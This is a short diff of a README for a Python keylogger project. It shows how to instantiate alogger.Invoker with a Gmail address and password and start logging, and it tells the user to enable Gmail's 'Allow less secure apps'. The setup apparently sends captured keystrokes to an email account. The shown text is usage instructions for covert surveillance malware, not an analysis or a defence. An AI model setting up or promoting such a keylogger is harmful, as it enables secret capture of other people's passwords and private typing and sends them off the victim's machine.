@@ -24,10 +24,13 @@ keylogger.py
 alogger.py is all about code and keylogger is the file where we have to provide username and password.
 
 ######################################################
+
 import alogger
 
 keylogger = alogger.Invoker(100,"Email","Password") # Supply username and password overhere.
 keylogger.begin()
+
+
 ######################################################
 
 Make sure before you run the program,your gmail account should enable 'Allow less secure apps' otherwise it wont work.
